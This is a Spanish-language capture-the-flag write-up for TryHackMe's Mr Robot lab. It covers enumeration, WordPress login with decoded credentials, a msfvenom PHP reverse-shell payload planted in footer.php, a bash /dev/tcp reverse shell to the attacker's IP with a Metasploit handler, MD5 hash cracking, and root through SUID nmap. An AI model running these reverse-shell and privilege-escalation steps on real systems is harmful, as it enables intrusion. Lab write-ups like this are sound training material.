---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Medium
  - HTTP
  - FuzzingWeb
  - WordPress
  - CMS
  - ReverseShell
  - PrivilegeEscalation
  - SSH
  - SUID
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#WordPress|WordPress]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#SSH|SSH]]
		- [[#Escalada de Privilegios#SUID|SUID]]

---
# Resolviendo la máquina Mr Robot CTF

>En esta publicación, comparto cómo resolví la máquina **Mr Robot CTF** de [TryHackMe](https://tryhackme.com/room/mrrobot).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 10.10.185.109`

![[Pasted image 20250726074237.png]]

*TTL=63* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.185.109 -oG allPorts`

![[Pasted image 20250726074318.png]]

`nmap -p22,80,443 -sCV 10.10.185.109`

![[Pasted image 20250726074442.png]]
### HTTP

`http://10.10.185.109/`

![[Pasted image 20250726074649.png]]

`http://10.10.185.109/robots.txt`

![[Pasted image 20250726074714.png]]
#### Fuzzing Web

`gobuster dir -u http://10.10.185.109/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250726075102.png]]

---
## Explotación
### WordPress

`wpscan --url http://10.10.185.109 --enumerate u,vp`

![[Pasted image 20250726075510.png]]
![[Pasted image 20250726075531.png]]

Al no encontrarse ningún usuario, se procede a analizar todos los directorios obtenidos gracias al *fuzzing web*.

Se encuentra información interesante en el directorio: `http://10.10.185.109/license`.

![[Pasted image 20250726075714.png]]

![[Pasted image 20250726075725.png]]

![[Pasted image 20250726075734.png]]

Se encuentra una cadena `ZWxsaW90OkVSMjgtMDY1Mgo=`.

La cadena está cifrada en **Base64**.

`echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d`

![[Pasted image 20250726080012.png]]

Se obtienen las credenciales de acceso: usuario - `elliot` y contraseña - `ER28-0652`.

Se accede al panel de *login* y se introducen el usuario y contraseña obtenidos.

![[Pasted image 20250726080530.png]]

En la sección de *Appearance* tiene instalado *Editor*, que sirve para poder editar archivos.

![[Pasted image 20250726082645.png]]

Se genera un *payload malicioso* en **PHP** para obtener una *reverse shell*.

`msfvenom -p php/reverse_php LHOST=10.8.184.124 LPORT=1234 -f raw > pwned.php`

Se copia y se añade en un archivo, en este caso se añade al *footer.php*.

![[Pasted image 20250726082723.png]]
### Reverse Shell

Se inicia una escucha en el puerto 1234 para recibir la *reverse shell*.

`nc -nlvp 1234`

`bash -c "sh -i >& /dev/tcp/10.8.184.124/1235 0>&1"`

![[Pasted image 20250726082821.png]]

Se inicia nuevamente una escucha en el puerto 1235 para recibir la *reverse shell* y entablar una conexión estable.

`vim handler.rc`

```
use multi/handler
set PAYLOAD php/reverse_php
set LHOST 10.8.184.124
set LPORT 1235
run
```

`msfconsole -r handler.rc`

![[Pasted image 20250726082837.png]]

`background`

`sessions -u 1`

`sessions 2`
### Escalada de Privilegios

![[Pasted image 20250726083118.png]]

Se accede al directorio: `cd /home/robot`

`ls`

![[Pasted image 20250726083200.png]]

Se descarga el archivo: `password.raw-md5`.

`download password.raw-md5`

Se visualiza el archivo descargado.

`cat password.raw-md5`

![[Pasted image 20250726083314.png]]

La contraseña está cifrada en **MD5**.

Se descifra con [MD5Hashing](https://md5hashing.net/).

![[Pasted image 20250726083541.png]]

![[Pasted image 20250726083639.png]]

Ya tenemos usuario: `robot` y contraseña: `abcdefghijklmnopqrstuvwxyz`.
#### SSH

`ssh robot@10.10.185.109`

![[Pasted image 20250726083807.png]]

`ls -la`

![[Pasted image 20250726083938.png]]
#### SUID

Se realiza una búsqueda de permisos **SUID**.

`find / -perm -4000 2>/dev/null`

![[Pasted image 20250726084132.png]]

Se detecta el binario `/usr/local/bin/nmap` con **SUID** activado. Según [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#suid), puede explotarse para obtener una *shell* como *root*.

![[Pasted image 20250726084324.png]]

Se realiza una búsqueda y se encuentra lo siguiente: [Linux Privilege Escalation with Setuid and Nmap](https://www.adamcouch.co.uk/linux-privilege-escalation-setuid-nmap/).

![[Pasted image 20250726084430.png]]

`nmap --interactive`

`!sh`

![[Pasted image 20250726084522.png]]

`cd /root`

`ls`

![[Pasted image 20250726084623.png]]

---

